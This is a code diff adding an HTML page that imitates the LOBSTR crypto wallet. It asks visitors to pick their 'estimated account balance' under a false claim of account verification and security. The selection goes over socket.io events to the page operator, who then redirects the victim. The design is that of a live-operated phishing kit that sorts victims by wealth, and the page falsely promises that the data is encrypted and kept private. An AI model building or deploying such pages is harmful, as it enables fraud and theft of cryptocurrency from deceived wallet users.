@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Estimated Balance</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg" type="image/svg+xml">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Ubuntu', sans-serif;
+            background: rgb(0, 0, 0);
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        
+        .main-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .header-logo {
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+        
+        .logo-container {
+            background: #1B8DA0;
+            padding: 15px 30px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        
+        .logo-container img {
+            width: 120px;
+            height: auto;
+        }
+        
+        .logo-fallback {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0;
+        }
+        
+        .content-wrapper {
+            background: rgb(12, 12, 12);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+        }
+        
+        .header {
+            margin-bottom: 35px;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #ffffff;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .header p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .amount-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+        
+        .amount-option {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 16px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .amount-option:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+            transform: translateX(4px);
+        }
+        
+        .amount-option.selected {
+            background: rgba(27, 141, 160, 0.15);
+            border-color: #1B8DA0;
+            border-width: 2px;
+            padding: 15px 19px;
+        }
+        
+        .amount-option.selected::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background: #1B8DA0;
+        }
+        
+        .amount-text {
+            font-size: 16px;
+            color: #ffffff;
+            font-weight: 400;
+        }
+        
+        .submit-button {
+            width: 100%;
+            padding: 16px;
+            background: #1B8DA0;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Ubuntu', sans-serif;
+        }
+        
+        .submit-button:hover:not(:disabled) {
+            background: #157689;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(27, 141, 160, 0.3);
+        }
+        
+        .submit-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+        
+        .submit-button:disabled {
+            background: rgba(27, 141, 160, 0.3);
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+            padding: 10px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 6px;
+            border-left: 3px solid #ff6b6b;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer-note {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+            line-height: 1.5;
+        }
+        
+        @media (max-width: 768px) {
+            .content-wrapper {
+                padding: 30px 20px;
+                border-radius: 12px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .amount-option {
+                padding: 14px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="header-logo">
+            <div class="logo-container">
+                <img src="https://static.lobstr.co/static/landing/images/logo.svg" 
+                     alt="LOBSTR Logo" 
+                     onerror="this.style.display='none'; this.parentElement.innerHTML='<h2 class=\'logo-fallback\'>LOBSTR</h2>'">
+            </div>
+        </div>
+        
+        <div class="content-wrapper">
+            <div class="header">
+                <h1>Estimated Account Balance</h1>
+                <p>This information helps us verify and secure your account</p>
+            </div>
+            
+            <div class="amount-options">
+                <div class="amount-option" data-value="Under $1,000">
+                    <span class="amount-text">Under $1,000</span>
+                </div>
+                
+                <div class="amount-option" data-value="$1,000 - $9,999">
+                    <span class="amount-text">$1,000 - $9,999</span>
+                </div>
+                
+                <div class="amount-option" data-value="$10,000 - $99,999">
+                    <span class="amount-text">$10,000 - $99,999</span>
+                </div>
+                
+                <div class="amount-option" data-value="$100,000 - $249,999">
+                    <span class="amount-text">$100,000 - $249,999</span>
+                </div>
+                
+                <div class="amount-option" data-value="$250,000 - $999,999">
+                    <span class="amount-text">$250,000 - $999,999</span>
+                </div>
+                
+                <div class="amount-option" data-value="Over $1,000,000">
+                    <span class="amount-text">Over $1,000,000</span>
+                </div>
+            </div>
+            
+            <button type="submit" class="submit-button" id="submitBtn" disabled>
+                Continue
+            </button>
+            
+            <div class="error-message" id="errorMessage"></div>
+            
+            <div class="footer-note">
+                Your information is encrypted and secure. We will never share your data without your permission.
+            </div>
+        </div>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const amountOptions = document.querySelectorAll('.amount-option');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            let selectedAmount = null;
+            
+            // Handle selection
+            amountOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remove selected class from all
+                    amountOptions.forEach(opt => opt.classList.remove('selected'));
+                    
+                    // Add selected class to clicked
+                    this.classList.add('selected');
+                    
+                    // Get the value
+                    selectedAmount = this.getAttribute('data-value');
+                    
+                    // Enable submit button
+                    submitBtn.disabled = false;
+                    
+                    // Clear any error messages
+                    errorMessage.style.display = 'none';
+                    errorMessage.textContent = '';
+                });
+            });
+            
+            // Handle submit
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (!selectedAmount) {
+                    errorMessage.textContent = 'Please select an amount range';
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+                
+                // Disable button and show loading
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="loading-spinner"></span>';
+                
+                // Emit socket event
+                if (typeof socket !== 'undefined') {
+                    socket.emit('amount_confirmed', {
+                        amount: selectedAmount,
+                        timestamp: new Date().toISOString(),
+                        page: 'lobstrEstimatedBalance'
+                    });
+                    
+                    socket.emit('page_loading', true);
+                    
+                    // Request redirect after a short delay
+                    setTimeout(() => {
+                        socket.emit('request_redirect', { page: 'lobstrLoading' });
+                    }, 500);
+                } else {
+                    console.error('Socket not initialized');
+                    errorMessage.textContent = 'Connection error. Please refresh the page.';
+                    errorMessage.style.display = 'block';
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = 'Continue';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
